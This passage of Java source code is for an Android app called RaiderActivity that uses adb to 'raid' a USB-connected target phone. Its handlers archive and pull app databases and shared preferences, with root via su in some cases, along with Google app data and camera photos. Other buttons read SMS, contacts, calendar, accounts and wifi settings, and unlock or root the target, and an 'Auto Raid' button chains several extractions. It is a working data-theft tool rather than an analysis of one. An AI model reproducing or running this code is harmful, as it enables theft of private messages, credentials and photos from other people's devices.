							btnGetGoogleData.setEnabled(true);
							btnGetPics.setEnabled(true);
							btnADBRoot.setEnabled(true);
							btnAutoRaid.setEnabled(true);
							btnClearOutput.setEnabled(true);
							btnListPackages.setEnabled(true);
							btnUnlockTarget.setEnabled(true);
							btnGetAccounts.setEnabled(true);
							btnLockTarget.setEnabled(true);
							btnRootTarget.setEnabled(true);
							btnGetMapsData.setEnabled(true);
							btnGetWifi.setEnabled(true);
							btnGetData.setTextColor(Color.WHITE);
							btnGetDataRoot.setTextColor(Color.WHITE);
							btnGetGoogleData.setTextColor(Color.WHITE);
							btnGetPics.setTextColor(Color.WHITE);
							btnADBRoot.setTextColor(Color.WHITE);
							btnAutoRaid.setTextColor(Color.WHITE);
							btnClearOutput.setTextColor(Color.WHITE);
							btnListPackages.setTextColor(Color.WHITE);
							btnUnlockTarget.setTextColor(Color.WHITE);
							btnGetAccounts.setTextColor(Color.WHITE);
							btnLockTarget.setTextColor(Color.WHITE);
							btnRootTarget.setTextColor(Color.WHITE);
							btnGetSms.setEnabled(true);
							btnGetCalendar.setEnabled(true);
							btnGetContacts.setEnabled(true);
							btnGetSms.setTextColor(Color.WHITE);
							btnGetCalendar.setTextColor(Color.WHITE);
							btnGetContacts.setTextColor(Color.WHITE);
							btnGetMapsData.setTextColor(Color.WHITE);
							btnGetWifi.setTextColor(Color.WHITE);

						}
					} catch (Exception ex) {

					}
				}

				while ((s = mainstdError.readLine()) != null) {
					etInput.append(s.toString());
					etInput.append("\r\n");
				}

			} catch (IOException e) {
				etInput.append("exception happened - here's what I know: ");
				etInput.append(e.toString());
			}
			;

		}
	};

	private final View.OnClickListener btnEnterpressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {

			String s = null;
			try {

				/* run the Unix "adb devices" command */
				String strCommand = etCommand.getText().toString();
				Process p = Runtime.getRuntime().exec(strCommand);

				BufferedReader stdInput = new BufferedReader(
						new InputStreamReader(p.getInputStream()));

				BufferedReader stdError = new BufferedReader(
						new InputStreamReader(p.getErrorStream()));

				StringBuilder sb = new StringBuilder();

				while ((s = stdInput.readLine()) != null) {

					sb.append(s + "\r\n");

					try {

						etInput.append(sb);

					} catch (Exception ex) {

					}
				}

				// read any errors from the attempted command

				while ((s = stdError.readLine()) != null) {

					etInput.append(s.toString());
					etInput.append("\r\n");
				}

			} catch (IOException e) {

				etInput.append("exception happened - here's what I know: ");

				etInput.append(e.toString());

			}
			;
		}
	};

	private final View.OnClickListener btnGetDatapressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			etInput.append("Trying to get data from target. Please be patient, this may take a while.");
			new doGetData().execute();
		}
	};

	private final View.OnClickListener btnGetDataRootpressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			etInput.append("Trying to get data from target. Please be patient, this may take a while.");
			new doGetDataRoot().execute();
		}
	};

	private final View.OnClickListener btnGetGoogleDatapressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			etInput.append("Trying to get data from target. Please be patient, this may take a while.");
			new doGetGoogleData().execute();
		}
	};

	private final View.OnClickListener btnGetPicspressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			etInput.append("Trying to get data from target. Please be patient, this may take a while.");
			new doGetPics().execute();
		}
	};

	private final View.OnClickListener btnADBRootpressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			String s = null;
			try {
				/* run the Unix "adb devices" command */
				Process p = Runtime.getRuntime().exec("adb root");
				BufferedReader stdInput = new BufferedReader(
						new InputStreamReader(p.getInputStream()));
				BufferedReader stdError = new BufferedReader(
						new InputStreamReader(p.getErrorStream()));
				StringBuilder sb = new StringBuilder();
				while ((s = stdInput.readLine()) != null) {
					sb.append(s + "\r\n");

					try {
						etInput.append(sb);
					} catch (Exception ex) {

					}
				}

				while ((s = stdError.readLine()) != null) {
					etInput.append(s.toString());
					etInput.append("\r\n");
				}

			} catch (IOException e) {
				etInput.append("exception happened - here's what I know: ");
				etInput.append(e.toString());
			}
			;

		}
	};

	private final View.OnClickListener btnAutoRaidpressed = new View.OnClickListener() {

		@Override
		public void onClick(View v) {
			if (!strDevice.equals("")) {
				etInput.append("Raiding target...");
				etInput.append("\r\n");

				doWaitForDevice();

				new doGetData().execute();
				new doGetDataRoot().execute();
				new doGetGoogleData().execute();
				new doGetPics().execute();
			} else {
				etInput.append("No target device found. Please check connection!");
			}

		}

	};

	private final View.OnClickListener btnClearOutputpressed = new View.OnClickListener() {

		@Override
		public void onClick(View v) {

			etInput.setText("");

		}

	};

	private final View.OnClickListener btnListPackagespressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			if (!strDevice.equals("")) {
				etInput.append("Trying to get data from target. Please be patient, this may take a while.");
				doGetPackages();
			} else {
				etInput.append("No target device found. Please check connection!");
			}

		}

	};

	private final View.OnClickListener btnUnlockTargetpressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			if (!strDevice.equals("")) {
				doUnlockTarget();
			} else {
				etInput.append("No target device found. Please check connection!");
			}

		}

	};

	private final View.OnClickListener btnLockTargetpressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			if (!strDevice.equals("")) {
				doLockTarget();
			} else {
				etInput.append("No target device found. Please check connection!");
			}

		}

	};

	private final View.OnClickListener btnGetAccountspressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			if (!strDevice.equals("")) {
				etInput.append("Trying to read accounts. This may take a while. Please be patient...\r\n");
				doReadAccounts();
			} else {
				etInput.append("No target device found. Please check connection!");
			}

		}

	};

	private final View.OnClickListener btnGetSmspressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			if (!strDevice.equals("")) {
				etInput.append("Trying to read sms. This may take a while. Please be patient...\r\n");
				doReadSms();
			} else {
				etInput.append("No target device found. Please check connection!");
			}

		}

	};

	private final View.OnClickListener btnGetCalendarpressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			if (!strDevice.equals("")) {
				etInput.append("Trying to calendar accounts. This may take a while. Please be patient...\r\n");
				doReadCalendar();
			} else {
				etInput.append("No target device found. Please check connection!");
			}

		}

	};

	private final View.OnClickListener btnGetContactspressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			if (!strDevice.equals("")) {
				etInput.append("Trying to read contacts. This may take a while. Please be patient...\r\n");
				doReadContacts();
			} else {
				etInput.append("No target device found. Please check connection!");
			}

		}

	};

	private final View.OnClickListener btnGetMapsDatapressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			if (!strDevice.equals("")) {
				etInput.append("Trying to read MAPS Data. This may take a while. Please be patient...\r\n");
				doReadMapsData();
			} else {
				etInput.append("No target device found. Please check connection!");
			}

		}

	};

	private final View.OnClickListener btnGetWifipressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			if (!strDevice.equals("")) {
				etInput.append("Trying to read wifi settings. This may take a while. Please be patient...\r\n");
				doReadWifi();
			} else {
				etInput.append("No target device found. Please check connection!");
			}

		}

	};

	private final View.OnClickListener btnRootTargetpressed = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			if (!strDevice.equals("")) {
				doRootTarget();
			} else {
				etInput.append("No target device found. Please check connection!");
			}

		}

	};

	private class doStartADB extends AsyncTask<Void, Void, String> {

		StringBuilder sb = new StringBuilder();

		@Override
		protected void onPreExecute() {
			progressDialog = ProgressDialog.show(RaiderActivity.this,
					"Starting ADB", " Please wait ... ", true);
			super.onPreExecute();
		}

		@Override
		protected String doInBackground(Void... param) {

			String s = null;

			try {

				/* start adb as root */

				doInitializeShellProcess();

				DataOutputStream os = new DataOutputStream(
						mainprocess.getOutputStream());
				os.writeBytes("adb kill-server && adb start-server\n");
				os.writeBytes("exit\n");
				os.flush();

				while ((s = mainstdInput.readLine()) != null) {

					sb.append(s + "\r\n");

				}

				while ((s = mainstdError.readLine()) != null) {
					sb.append(s + "\r\n");
				}

			} catch (IOException e) {
				sb.append("exception happened - here's what I know: ");

				sb.append(e.toString());

			}
			;
			return sb.toString();
		}

		@Override
		protected void onPostExecute(String result) {
			progressDialog.dismiss();
			etInput.append(result);
			super.onPostExecute(result);
		}
	}

	private class doGetData extends AsyncTask<Void, Void, String> {

		StringBuilder sb = new StringBuilder();

		@Override
		protected void onPreExecute() {
			progressDialog = ProgressDialog.show(RaiderActivity.this,
					"Raiding data", " Please wait ... ", true);
			super.onPreExecute();
		}

		@Override
		protected String doInBackground(Void... param) {

			String s = null;
			String dir = "/sdcard/Android/data";

			if (doCheckDirs(dir)) {

				doCheckIfADBIsRunning();
				if (bADBRunning) {

					try {

						/* run the Unix "adb devices" command */

						String outdir = Environment
								.getExternalStorageDirectory().toString();

						doInitializeShellProcess();

						DataOutputStream os = new DataOutputStream(
								mainprocess.getOutputStream());

						os.writeBytes("adb -d -s "
								+ strDevice
								+ " shell \"tar -cf "
								+ outdir
								+ "/raider-data-"
								+ strDevice
								+ ".tar /sdcard/Android/data/*/shared_prefs /sdcard/Android/data/*/databases\" && cd "
								+ outdir + " && adb -d -s " + strDevice
								+ " pull /mnt/sdcard/raider-data-" + strDevice
								+ ".tar\n");

						os.writeBytes("exit\n");
						os.flush();
						sb.append("Data extraction finished.");

						while ((s = mainstdInput.readLine()) != null) {

							if (s.contains("No such file or directory")) {
								sb.append("No relevant data found on sdcard...\r\n");
							} else {
								sb.append(s + "\r\n");
							}

						}

						while ((s = mainstdError.readLine()) != null) {
							sb.append(s + "\r\n");

						}

					} catch (IOException e) {
						progressDialog.dismiss();
						sb.append("exception happened - here's what I know: ");
						sb.append(e.toString());
					}
					;
				} else {

					sb.append("ADB not running. Please start it first \r\n");
				}

			} else {

				sb.append("/sdcard/Android/data/ not present \r\n");
			}

			return sb.toString();
		}

		@Override
		protected void onPostExecute(String result) {
			progressDialog.dismiss();
			etInput.append(result);
			super.onPostExecute(result);
		}

	}

	private class doGetDataRoot extends AsyncTask<Void, Void, String> {

		StringBuilder sb = new StringBuilder();

		@Override
		protected void onPreExecute() {
			progressDialog = ProgressDialog.show(RaiderActivity.this,
					"Raiding data as root", " Please wait ... ", true);
			super.onPreExecute();
		}

		@Override
		protected String doInBackground(Void... param) {

			String s = null;
			String dir = "/data/data";

			if (doCheckDirs(dir)) {

				doCheckIfADBIsRunning();
				if (bADBRunning) {

					try {

						/* run the Unix "adb devices" command */

						String outdir = Environment
								.getExternalStorageDirectory().toString();

						doInitializeShellProcess();

						DataOutputStream os = new DataOutputStream(
								mainprocess.getOutputStream());

						os.writeBytes("adb -d -s "
								+ strDevice
								+ " shell su -c \"tar -cf "
								+ outdir
								+ "/raider-data-root-"
								+ strDevice
								+ ".tar /data/data/*/shared_prefs /data/data/*/databases\" && cd "
								+ outdir + " && adb -d -s " + strDevice
								+ " pull /mnt/sdcard/raider-data-root-"
								+ strDevice + ".tar\n");

						os.writeBytes("exit\n");
						os.flush();
						sb.append("Data extraction finished.");

						while ((s = mainstdInput.readLine()) != null) {

							sb.append(s + "\r\n");

						}

						while ((s = mainstdError.readLine()) != null) {
							sb.append(s + "\r\n");

						}

					} catch (IOException e) {
						progressDialog.dismiss();
						sb.append("exception happened - here's what I know: ");
						sb.append(e.toString());
					}
					;
				} else {

					sb.append("ADB not running. Please start it first \r\n");
				}

			} else {

				sb.append("/data/data/ not present \r\n");
			}

			return sb.toString();
		}

		@Override
		protected void onPostExecute(String result) {
			progressDialog.dismiss();
			etInput.append(result);
			super.onPostExecute(result);
		}

	}

	private class doGetGoogleData extends AsyncTask<Void, Void, String> {

		StringBuilder sb = new StringBuilder();

		@Override
		protected void onPreExecute() {
			progressDialog = ProgressDialog.show(RaiderActivity.this,
					"Raiding google data", " Please wait ... ", true);
			super.onPreExecute();
		}

		@Override
		protected String doInBackground(Void... param) {

			String s = null;
			String dir = "/data/data";

			if (doCheckDirs(dir)) {

				doCheckIfADBIsRunning();
				if (bADBRunning) {

					try {

						/* run the Unix "adb devices" command */

						String outdir = Environment
								.getExternalStorageDirectory().toString();

						doInitializeShellProcess();

						DataOutputStream os = new DataOutputStream(
								mainprocess.getOutputStream());

						os.writeBytes("adb -d -s "
								+ strDevice
								+ " shell su -c \"tar -c /data/data/com.google.* >   "
								+ outdir + "/raider-googledata-" + strDevice
								+ ".tar\" && cd " + outdir + " && adb -d -s "
								+ strDevice
								+ " pull /mnt/sdcard/raider-googledata-"
								+ strDevice + ".tar\n");

						os.writeBytes("exit\n");
						os.flush();
						sb.append("Data extraction finished.");

						while ((s = mainstdInput.readLine()) != null) {

							sb.append(s + "\r\n");

						}

						while ((s = mainstdError.readLine()) != null) {
							sb.append(s + "\r\n");

						}

					} catch (IOException e) {
						progressDialog.dismiss();
						sb.append("exception happened - here's what I know: ");
						sb.append(e.toString());
					}
					;
				} else {

					sb.append("ADB not running. Please start it first \r\n");
				}

			} else {

				sb.append("/data/data/ not present \r\n");
			}

			return sb.toString();
		}

		@Override
		protected void onPostExecute(String result) {
			progressDialog.dismiss();
			etInput.append(result);
			super.onPostExecute(result);
		}

	}

	private class doGetPics extends AsyncTask<Void, Void, String> {

		StringBuilder sb = new StringBuilder();

		@Override
		protected void onPreExecute() {
			progressDialog = ProgressDialog.show(RaiderActivity.this,
					"Raiding pictures", " Please wait ... ", true);
			super.onPreExecute();
		}

		@Override
		protected String doInBackground(Void... param) {

			String s = null;
			String dir = "/mnt/sdcard/DCIM/Camera";

			if (doCheckDirs(dir)) {

				doCheckIfADBIsRunning();
				if (bADBRunning) {

					try {

						/* run the Unix "adb devices" command */

						String outdir = Environment
								.getExternalStorageDirectory().toString();

						doInitializeShellProcess();

						DataOutputStream os = new DataOutputStream(
								mainprocess.getOutputStream());

						os.writeBytes("adb -d -s "
								+ strDevice
								+ " shell \"tar -c /mnt/sdcard/DCIM/Camera >   "
								+ outdir + "/raider-pics-" + strDevice
								+ ".tar\" && cd " + outdir + " && adb -d -s "
								+ strDevice + " pull /mnt/sdcard/raider-pics-"
								+ strDevice + ".tar\n");

						os.writeBytes("exit\n");
						os.flush();
						sb.append("Data extraction finished.");

						while ((s = mainstdInput.readLine()) != null) {

							sb.append(s + "\r\n");

						}

						while ((s = mainstdError.readLine()) != null) {
							sb.append(s + "\r\n");

						}

					} catch (IOException e) {
						progressDialog.dismiss();
						sb.append("exception happened - here's what I know: ");
						sb.append(e.toString());
					}
					;
				} else {

					sb.append("ADB not running. Please start it first \r\n");
				}

			} else {

				sb.append("/mnt/sdcard/DCIM/Camera not present \r\n");
			}

			return sb.toString();
		}

		@Override
		protected void onPostExecute(String result) {
			progressDialog.dismiss();
			etInput.append(result);
			super.onPostExecute(result);
		}

	}

}